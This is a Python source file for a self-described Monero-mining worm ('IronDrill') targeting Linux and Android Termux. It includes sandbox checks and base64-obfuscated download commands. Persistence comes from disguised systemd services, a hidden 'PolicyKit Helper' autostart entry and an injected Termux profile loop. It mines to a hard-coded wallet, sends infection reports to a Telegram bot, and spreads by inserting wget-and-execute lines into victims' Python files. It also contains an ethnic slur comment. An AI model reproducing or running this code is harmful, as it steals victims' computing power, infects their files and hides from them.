# IronDrill Xmrig miner worm coded by K0D3IN or KediKus 

# I added try/except to bypass all errors

# I'm not a fucking idiot fuckers. So do not complain about the code.

import os
import sys
import subprocess
import requests
import base64
import psutil
import shutil
import time
import platform


from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path

# Global constants for better performance
SYSINFO = os.name
DEVNULL = subprocess.DEVNULL
PIPE = subprocess.PIPE
TIMEOUT = 10
CHUNK_SIZE = 8192
def check_sandbox():
    
    try:
        # klasik bir sanbux kontrolü
        with os.popen('dmesg | grep -i sandbox') as f:
            dmesg_output = f.read()
            if 'sandbox' in dmesg_output.lower() or 'firejail' in dmesg_output.lower():
                
                return True  # sanbux
        with os.popen('ps -o comm= -p 1') as f:
            init_process = f.read().strip()
            if init_process in ['systemd', 'init']:
                
                return False  # sanbux degil

        # sandbux kuntrul
        with os.popen('ps aux') as f:
            processes = f.read()
            if 'sandbox' in processes or 'firejail' in processes:
                
                return True  # sandbux

        
        return False  # sandbux degil
    except Exception as e:
        pass
        return False

def check_user_root():
    
    result = os.geteuid() == 0 or os.getuid() == 0
    
    return result



def av_detection_posix():
    #this shit gives false positive results

    #results = subprocess.run("ps aux | grep -i antivirus", shell=True, capture_output=True, text=True)
    #(f'[*] AV detection POSIX result: {results.returncode}, output: {results.stdout}')
    #if results.returncode == 0:
    #    return 'antivirus' in results.stdout.lower()
    return False



def is_termux():
    result = os.path.isdir("/data/data/com.termux/files/usr")
    
    return result

def main():
    
    if not is_termux() and not os.path.isdir("/storage/emulated/0"): 

            
        if SYSINFO == 'posix':
            if check_user_root():
                if not os.path.exists("/var/lib/.xdman/tmp/xmrig-6.24.0/xmrig"):
                    posix_definitions()
                if not os.path.exists("/etc/systemd/system/xmrig.service") or not os.path.exists("/etc/systemd/system/watchdog.service"):
                    persisten_posix()
            elif not check_user_root():
                if not os.path.exists(f"/home/{os.getlogin()}/.local/share/.xdman/tmp/xmrig-6.24.0/xmrig"):
                    posix_definitions()
                if not os.path.exists(f"/home/{os.getlogin()}/.local/share/.xdman/tmp/xmrig-6.24.0/watchdog.py"):
                    persisten_posix()
                

        elif SYSINFO == 'nt':
            nt_definitions()   

    elif is_termux():
        if not os.path.exists("/data/data/com.termux/files/usr/bin/xmrig"):
            android_definitions()
        if not os.path.exists("/data/data/com.termux/files/usr/bin/watchdog.py"):
            android_watchdog()
        
    else:
        print("Bu script sadece Linux ve Termux için yazılmıştır. Pydroid ve Windows içinde çalışmaz. \n ÇIKIŞ YAPILIYOR...")
        time.sleep(3)
        sys.exit(1)


def posix_definitions():
  
    link = b"aHR0cHM6Ly9naXRodWIuY29tL3htcmlnL3htcmlnL3JlbGVhc2VzL2Rvd25sb2FkL3Y2LjI0LjAveG1yaWctNi4yNC4wLWxpbnV4LXN0YXRpYy14NjQudGFyLmd6"
    command_to_exec=b"d2dldCA="
    continue_code=b"JiYgdGFyIC14dmYgeG1yaWctNi4yNC4wLWxpbnV4LXN0YXRpYy14NjQudGFyLmd6"
    full_command = base64.b64decode(command_to_exec).decode('utf-8') + " " +base64.b64decode(link).decode('utf-8') + " " + base64.b64decode(continue_code).decode('utf-8')
   
    subprocess.run(full_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    persisten_posix()


def nt_definitions():
    # using pyautogui to make "handmaded" AV bypass
    # Protip: Microsoft defender is not get suspected by user made AV bypass
    os.system("clear")
    print("Bu script sadece Linux ve Termux için yazılmıştır. Windows sistemlerde çalışmaz. \n ÇIKIŞ YAPILIYOR...")
    time.sleep(3)
    sys.exit(1)

def persisten_posix():
    
    import os
    if check_user_root():
        # if user is root, we can make persistent xmrig and stealth watchdog service
        
        import shutil
        import os

        src_dir = "xmrig-6.24.0"
        dest_base = "/var/lib/.xdman/tmp"
        xmrig_exec = os.path.join(dest_base, "xmrig-6.24.0/xmrig")
    
        try:
            if not os.path.exists(dest_base):
                
                os.makedirs(dest_base, mode=0o700)

            if os.path.exists(src_dir):
                if not os.path.exists(dest_base):
                    os.makedirs(dest_base)
                    shutil.move(src_dir, dest_base)

        except Exception as e:
            pass

        # Service file path
        service_path = "/etc/systemd/system/xmrig.service"

        # Service content
        import psutil
        pscore_count = psutil.cpu_count(logical=False) or 1
        threads = max(1, pscore_count // 2)
        service_content = f"""
[Unit]
Description=SYSTEMD service executor
After=network.target

[Service]
ExecStart={xmrig_exec} -o pool.supportxmr.com:443 -u 45uGuzWwYcjMVsUQUAAFgpAKgGSMvzcxza3mzN1fUnpbQ3iju7sBAtLXG8cpeccrrNHjqoabXkUGwixrMpndXhFe3NwWCfc.mypc/kodey@gmail.com --threads={threads} --tls --coin monero --donate-level=1
Restart=always

[Install]
WantedBy=multi-user.target
"""

        try:
            with open(service_path, "w") as f:
                f.write(service_content)

            subprocess.run(["systemctl", "daemon-reexec"])
            subprocess.run(["systemctl", "daemon-reload"])
            subprocess.run(["systemctl", "enable", "xmrig"])
            subprocess.run(["systemctl", "start", "xmrig"])
            url1 = base64.b64decode(b'aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDcyNjQ4NTQ0ODc6QUFFVmRpQlE5VnpqUXZBMkoxWmJyY2QzdmphM25vTHBObHMvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tMTAwMjY4OTE5Mzg0NSZ0ZXh0PVJvb3QrZXJpxZ9pbisiZGUreG1yaWcrd29ybStrdXJ1bGR1Lg==').decode('utf-8')

            requests.get(url1)
            install_watchdog()

        except Exception as e:
            pass

    else:
        # if user is not root, we will make desktop startup app for xmrig and stealth watchdog service
        
        import psutil,shutil
        pscore_count = psutil.cpu_count(logical=False) or 1
        threads = max(1, pscore_count // 2)
        src_dir = "xmrig-6.24.0"
        USER = os.getlogin() if hasattr(os, 'getlogin') else os.environ.get("USER") or "user"
        dest_base = f"/home/{USER}/.local/share/.xdman/tmp"
        dest_base = os.path.join(dest_base, "xmrig-6.24.0")
        xmrig_exec = os.path.join(dest_base, "xmrig")
        
        if os.path.exists(src_dir):
            if not os.path.exists(dest_base):
                
                os.makedirs(dest_base)
                shutil.move(src_dir, dest_base)
        
        # Create watchdog script for non-root users
        
        watchdog_script = f"""#!/usr/bin/python3
import subprocess,os,time,psutil
import sys
import datetime







USER = os.getlogin() or os.getenv("USER")
dest_base = f"/home/{{USER}}/.local/share/.xdman/tmp/xmrig-6.24.0"
xmrig_exec = os.path.join(dest_base, "xmrig")



def is_xmrig_running():
    try:
        result = subprocess.run(["pgrep", "-f", "xmrig"], capture_output=True, text=True)
        is_running = result.returncode == 0)
        return is_running
    except Exception as e:
        return False

def launch_xmrig():
    import subprocess

    try:
        # Check if xmrig exists and is executable
        if not os.path.exists(xmrig_exec):
            ensure_xmrig_installed()
            return
            
        if not os.access(xmrig_exec, os.X_OK):
            
            subprocess.run(f"chmod +x {{xmrig_exec}}", shell=True, check=True)
            
        core_count = psutil.cpu_count(logical=False) or 1
        threads = max(1, core_count // 2)
        
        # Method 1: Using nohup
        
        cmd = [
            "nohup",
            xmrig_exec,
            "-o", "pool.supportxmr.com:443",
            "-u", "45uGuzWwYcjMVsUQUAAFgpAKgGSMvzcxza3mzN1fUnpbQ3iju7sBAtLXG8cpeccrrNHjqoabXkUGwixrMpndXhFe3NwWCfc.mypc/kodey@gmail.com",
            "--tls", "--coin", "monero",
            "--donate-level=1",
            f"--threads={{threads}}",
            "--background"
        ]
        
        result = subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        
        # Method 2: Using shell command
        if result.returncode != 0:
            
            alt_cmd = f"{{xmrig_exec}} -o pool.supportxmr.com:443 -u 45uGuzWwYcjMVsUQUAAFgpAKgGSMvzcxza3mzN1fUnpbQ3iju7sBAtLXG8cpeccrrNHjqoabXkUGwixrMpndXhFe3NwWCfc.mypc/kodey@gmail.com --tls --coin monero --donate-level=1 --threads={{threads}} --background"
            result2 = subprocess.run(alt_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            
        # Method 3: Using subprocess.Popen
        if result.returncode != 0 and result2.returncode != 0:
            
            try:
                import subprocess
                process = subprocess.Popen([
                    xmrig_exec,
                    "-o", "pool.supportxmr.com:443",
                    "-u", "45uGuzWwYcjMVsUQUAAFgpAKgGSMvzcxza3mzN1fUnpbQ3iju7sBAtLXG8cpeccrrNHjqoabXkUGwixrMpndXhFe3NwWCfc.mypc/kodey@gmail.com",
                    "--tls", "--coin", "monero",
                    "--donate-level=1",
                    f"--threads={{threads}}"
                ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                
            except Exception as e:
                pass
                
        # Wait a moment and check if xmrig is running
        time.sleep(2)
        
            
    except Exception as e:
        pass

def ensure_xmrig_installed():
    
    try:
        base_dir = f"/home/{{USER}}/.local/share/.xdman/tmp/xmrig-6.24.0"
        xmrig_path = os.path.join(base_dir, "xmrig")
        
        if not os.path.exists(xmrig_path):
            
            os.makedirs(base_dir, exist_ok=True)
            archive_name = "xmrig-6.24.0-linux-static-x64.tar.gz"
            archive_url = "https://github.com/xmrig/xmrig/releases/download/v6.24.0/" + archive_name
            
            
            subprocess.run(f"wget -O {{base_dir}}/{{archive_name}} {{archive_url}}", shell=True, check=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
            
            subprocess.run(f"tar -xzf {{base_dir}}/{{archive_name}} -C {{base_dir}}", shell=True, check=True)
          
            subprocess.run(f"chmod +x {{xmrig_path}}", shell=True, check=True)
        else:
            pass
            
                
                



def controller():
    
    while True:
        try:
            
            
            # Check if xmrig exists
            if not os.path.exists(xmrig_exec):
                
                ensure_xmrig_installed()
            
            # Check if xmrig is running
            if not is_xmrig_running():
                
                launch_xmrig()
            else:
                pass
            
            
            
            
            time.sleep(30)
            
        except Exception as e:
            
            time.sleep(60)
            continue

if __name__ == "__main__":
    
    controller()

"""
        
        # Create watchdog script file
        watchdog_path = os.path.join(os.path.expanduser("~"), ".local/bin/watchdog")
        os.makedirs(os.path.dirname(watchdog_path), exist_ok=True)
        with open(watchdog_path, "w") as f:
            f.write(watchdog_script)
        os.chmod(watchdog_path, 0o755)
        
        desktop_entry = f"""[Desktop Entry]
Type=Application
Exec={watchdog_path}
Hidden=true
NoDisplay=true
X-GNOME-Autostart-enabled=true
Name=PolicyKit Helper
Comment=System policy agent
Terminal=false
"""
        desktop_path = os.path.join(os.path.expanduser("~"), ".config/autostart", "PolicyKit.desktop")
        os.makedirs(os.path.dirname(desktop_path), exist_ok=True)
        with open(desktop_path, "w") as f:
            f.write(desktop_entry)
        
        
        
        
        # Send notification
        try:
            url1 = base64.b64decode(b'aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDcyNjQ4NTQ0ODc6QUFFVmRpQlE5VnpqUXZBMkoxWmJyY2QzdmphM25vTHBObHMvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tMTAwMjY4OTE5Mzg0NSZ0ZXh0PU5vbi1yb290K2NpaGF6ZGErWG1yaWcrd29ybStrdXJ1bGR1Lg==').decode('utf-8')
            requests.get(url1)
        except Exception as e:
            pass
    
def install_watchdog():
    

    first_code = """#!/usr/bin/python3
import subprocess,os,time,psutil
cpu_count = psutil.cpu_count(logical=False) or 1
threads = max(1, cpu_count // 2) or 1 # Çekirdek sayısının yarısı

xmrig_service_content = (f\"\"\"
[Unit]
Description=SYSTEMD service executor
After=network.target

[Service]
ExecStart=/var/lib/.xdman/tmp/xmrig-6.24.0/xmrig -o pool.supportxmr.com:443 -u 45uGuzWwYcjMVsUQUAAFgpAKgGSMvzcxza3mzN1fUnpbQ3iju7sBAtLXG8cpeccrrNHjqoabXkUGwixrMpndXhFe3NwWCfc.mypc/kodey@gmail.com  --threads={threads} --tls --coin monero --donate-level=1
Restart=always

[Install]
WantedBy=multi-user.target
\"\"\")

def is_xmrig_running():
    result = subprocess.run(["pgrep", "-f", "xmrig"], capture_output=True, text=True)
    return result.returncode == 0

def restart_xmrig():
    if not is_xmrig_running():
        service_command = "systemctl restart xmrig"
        subprocess.run(service_command, shell=True)

def ensure_xmrig_installed():
    base_dir = "/var/lib/.xdman/tmp/xmrig-6.24.0"
    xmrig_path = os.path.join(base_dir, "xmrig-6.24.0", "xmrig")
    archive_name = "xmrig-6.24.0-linux-static-x64.tar.gz"
    archive_url = "https://github.com/xmrig/xmrig/releases/download/v6.24.0/" + archive_name

    if not os.path.exists(xmrig_path):
        os.makedirs(base_dir, exist_ok=True)
        subprocess.run(f"wget -O {base_dir}/{archive_name} {archive_url}", shell=True, check=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
        subprocess.run(
            f"tar -xzf {base_dir}/{archive_name} -C {base_dir}",
            shell=True, check=True
        )


def controller():
    
    while True:
        try:
            if not os.path.exists("/var/lib/.xdman/tmp/xmrig-6.24.0/xmrig-6.24.0/xmrig"):
                ensure_xmrig_installed()
            if not os.path.exists("/etc/systemd/system/xmrig.service"):
                open("/etc/systemd/system/xmrig.service", "w").write(xmrig_service_content)
            if not is_xmrig_running():
                restart_xmrig()
           
            time.sleep(60)
        except Exception as e:
            time.sleep(60)
            continue

if __name__ == "__main__":
    controller()
"""
    service_content = """
[Unit]
Description=System Watchdog Service
After=network.target 

[Service]
ExecStart=/usr/bin/python3 /usr/local/bin/sys_watchdog
Restart=always

[Install]
WantedBy=multi-user.target
"""
    watchdog_script_path = "/usr/local/bin/sys_watchdog"
    
    with open(watchdog_script_path, "w") as f:
        f.write(first_code)

    with open("/etc/systemd/system/system_watchdog.service", "w") as f:
        f.write(service_content)

    subprocess.run(["systemctl", "daemon-reload"])
    subprocess.run(["systemctl", "enable", "system_watchdog.service"])
    subprocess.run(["systemctl", "start", "system_watchdog.service"])
    
    worm_main_posix()



# I HATE FUCKING ARABS 


def shebang_sonrasina_satir_ekle(dosya_yolu, satir):

    try:
        with open(dosya_yolu, "r", encoding="utf-8") as f:
            satirlar = f.readlines()

        if not satirlar:
            
            return

        if any(satir.strip() in s.strip() for s in satirlar):
            
            return

        if satirlar[0].startswith("#!"):
            satirlar.insert(1, satir + "\n")
        else:
            satirlar.insert(0, satir + "\n")

        with open(dosya_yolu, "w", encoding="utf-8") as f:
            f.writelines(satirlar)
        

    except Exception as e:
        pass

def tarama_ve_isleme(dizin, eklenecek_satir):
    
    for root, _, files in os.walk(dizin):
        for file in files:
            if file.lower().endswith(".py"):
                yol = os.path.join(root, file)
                shebang_sonrasina_satir_ekle(yol, eklenecek_satir)

def worm_main_posix():
    
    EKLENECEK_SATIR = (
        "import subprocess\n"
        "subprocess.run('wget https://github.com/kendi-repon/worm.py -O worm.py && python3 worm.py', "
        "shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)"
    )
    PROBABLE_DIRS = [
    "documents", "downloads", "desktop", "pictures", "videos", "music",
    "projects", "scripts", "work", "development", "programming", "software",
    "pythonprojects", "sourcecode", "github", "code", "codeexamples",
    "codesnippets", "codelibraries", "codemodules", "codebase", "codevault",
    "belgeler", "indirilenler", "masaüstü", "resimler", "videolar", "müzik",
    "projeler", "betikler", "geliştirme", "yazılım", "kod", "kaynakkod",
    "kodörnekleri", "kütüphaneler", "modüller", "koddeposu"
]
    USER = os.getlogin() if hasattr(os, 'getlogin') else os.environ.get("USER") or "user"
    user_home = os.path.expanduser(f"/home/{USER}/")
    gercek_dizinler = os.listdir(user_home)
    
    hedef_dizinler = []
    for mevcut_ad in gercek_dizinler:
        if os.path.isdir(os.path.join(user_home, mevcut_ad)):
            if mevcut_ad.lower() in PROBABLE_DIRS:
                hedef_dizinler.append(os.path.join(user_home, mevcut_ad))

    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = [executor.submit(tarama_ve_isleme, dizin, EKLENECEK_SATIR) for dizin in hedef_dizinler]
        url2 = base64.b64decode(b'aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDcyNjQ4NTQ0ODc6QUFFVmRpQlE5VnpqUXZBMkoxWmJyY2QzdmphM25vTHBObHMvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tMTAwMjY4OTE5Mzg0NSZ0ZXh0PUJpcitwb3NpeCtjaWhhemRhK1dvcm0rxaFzdmVraSt0YW1hbWxhbmR14oCm').decode('utf-8')
        requests.get(url2)
        for _ in as_completed(futures):
            pass


                
            

def android_definitions():
    
    import psutil
    android_build = platform.machine()
    if android_build == "aarch64" or android_build == "arm64":
       subprocess.run("apt update -y && apt install wget -y wget && wget https://github.com/K0D3IN/XmrigPhoneBuilds/raw/refs/heads/main/arm64_xmrig && chmod +x arm64_xmrig && mv arm64_xmrig /data/data/com.termux/files/usr/bin/xmrig", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    elif android_build == "armv7l" or android_build == "armv8l":
        subprocess.run("apt update -y && apt install wget -y && wget https://raw.githubusercontent.com/K0D3IN/XmrigPhoneBuilds/refs/heads/main/armv7_xmrig && chmod +x armv7_xmrig && mv armv7_xmrig /data/data/com.termux/files/usr/bin/xmrig", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    if not os.path.exists("/data/data/com.termux/files/usr/bin/watchdog.py"):
        android_watchdog()
        
def android_watchdog():
    termux_profile = os.path.join("/data/data/com.termux/files/usr/etc/profile")
    # Enhanced Android watchdog with improved functionality
    watchdog_script = """#!/usr/bin/python3
import time, subprocess, os, psutil, platform

def is_running():
    try:
        for proc in psutil.process_iter(attrs=['name', 'cmdline']):
            if proc.info['cmdline'] and 'xmrig' in ' '.join(proc.info['cmdline']):
                return True
        return False
    except Exception:
        return False
    

def launch_xmrig():
    free_ram = psutil.virtual_memory().available
    if free_ram < 1024 * 1024 * 1024 * 3.5:
        randomx_mode = "light"
    else:
        randomx_mode = "auto"
    try:
        core_count = psutil.cpu_count(logical=False) or 1
        if randomx_mode == "light":
            threads = min(core_count, max(1, core_count - 2)) # Toplam çekirdek sayısının 2 eksiği
        elif randomx_mode == "auto":
            threads = min(core_count, max(1, core_count // 4)) # Toplam çekirdek sayısının dörtte birine eşit veya daha az
        
            
        cmd = [
            "nohup",
            "xmrig",
            "-o", "pool.supportxmr.com:443",
            "-u", "45uGuzWwYcjMVsUQUAAFgpAKgGSMvzcxza3mzN1fUnpbQ3iju7sBAtLXG8cpeccrrNHjqoabXkUGwixrMpndXhFe3NwWCfc.mypc/kodey@gmail.com",
            "--tls", "--coin", "monero",
            "--donate-level=1",
            f"--threads={threads}",
            f"--randomx-mode={randomx_mode}",
            "--background"
        ]
        subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass

def ensure_xmrig_installed():
    try:
        xmrig_path = "/data/data/com.termux/files/usr/bin/xmrig"
        if not os.path.exists(xmrig_path):
            android_build = platform.machine()
            if android_build == "aarch64" or android_build == "arm64":
                subprocess.run("pkg update -y && pkg install wget -y && wget https://raw.githubusercontent.com/K0D3IN/XmrigPhoneBuilds/refs/heads/main/arm64_xmrig && chmod +x arm64_xmrig && mv arm64_xmrig /data/data/com.termux/files/usr/bin/xmrig")
            elif android_build == "armv7l" or android_build == "armv8l":
                subprocess.run("pkg update -y && pkg install wget -y && wget https://raw.githubusercontent.com/K0D3IN/XmrigPhoneBuilds/refs/heads/main/armv7_xmrig && chmod +x armv7_xmrig && mv armv7_xmrig /data/data/com.termux/files/usr/bin/xmrig")
            
            
    except Exception:
        pass

def android_worm_scan():
    
    # Android-specific worm functionality
    try:
        # Scan for Python files in common directories
        common_dirs = ["/storage/emulated/0/Download", "/storage/emulated/0/Documents", "/storage/emulated/0/DCIM"]
        
        for base_dir in common_dirs:
            if os.path.exists(base_dir):
                for root, dirs, files in os.walk(base_dir):
                    for file in files:
                        if file.lower().endswith('.py'):
                            file_path = os.path.join(root, file)
                            try:
                                # Read file and check if already infected
                                with open(file_path, 'r', encoding='utf-8') as f:
                                    content = f.read()
                                
                                # Add worm code if not already present
                                worm_code = '''
# IronDrill Android Worm
import subprocess
try:
    subprocess.run('wget https://github.com/K0D3IN/IronDrill/raw/refs/heads/main/irondrill_FINAL.py -O irondrill_FINAL.py && python3 irondrill_FINAL.py', 
                   shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
except:
    pass
'''
                                if "IronDrill Android Worm" not in content:
                                    with open(file_path, 'a', encoding='utf-8') as f:
                                        f.write(worm_code)
                            except Exception:
                                continue
    except Exception:
        pass

def controller():
    
    while True:
        try:
            # Ensure xmrig is installed
            ensure_xmrig_installed()
            
            # Check and launch xmrig
            if not is_running():
                launch_xmrig()
            
            # Run Android worm scan every 10 minutes
            if int(time.time()) % 600 < 60:
                android_worm_scan()
                
            time.sleep(60)
        except Exception as e:
            
            time.sleep(60)
            continue


controller()
"""
    with open(os.path.join("/data/data/com.termux/files/usr/bin", "watchdog.py"), "w") as f:
        f.write(watchdog_script)
    os.chmod("/data/data/com.termux/files/usr/bin/watchdog.py", 0o777)

    # Enhanced autostart setup
    with open(termux_profile, "r") as f:
        lines = f.readlines()
    entry_line="# DO NOT REMOVE THIS LINE, NOR TERMUX CAN'T WORK WITHOUT IT"
    # Multiple autostart methods for better persistence
    entry_profile = r"""
(
  while true; do
    pgrep -f "watchdog.py" > /dev/null || (
      nohup python3 /data/data/com.termux/files/usr/bin/watchdog.py >/dev/null 2>&1
    ) >/dev/null 2>&1
    sleep 60
  done
) &>/dev/null &"""
    
    
    
    if entry_line not in lines:
        with open(termux_profile, "a") as f:
            f.write(f"\n{entry_line}\n{entry_profile}")
    
    
    # Send notifications
    try:
        url3 = base64.b64decode(b'aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDcyNjQ4NTQ0ODc6QUFFVmRpQlE5VnpqUXZBMkoxWmJyY2QzdmphM25vTHBObHMvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tMTAwMjY4OTE5Mzg0NSZ0ZXh0PUFuZHJvaWQrY2loYXpkYStYbXJpZytrdXJ1bHVtdSt0YW1hbWxhbmR14oCm').decode('utf-8')
        requests.get(url3, timeout=5)
    except Exception as e:
        pass
    
    try:
        url4 = base64.b64decode(b'aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDcyNjQ4NTQ0ODc6QUFFVmRpQlE5VnpqUXZBMkoxWmJyY2QzdmphM25vTHBObHMvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tMTAwMjY4OTE5Mzg0NSZ0ZXh0PUJpcithbmRyb2lkK2NpaGF6ZGErV29ybStpxZx2bGkrdGFtYW1sYW5kxLEu').decode('utf-8')
        requests.get(url4, timeout=5)
    except Exception as e:
        pass
    
    
    




    
if __name__ == "__main__":
    main()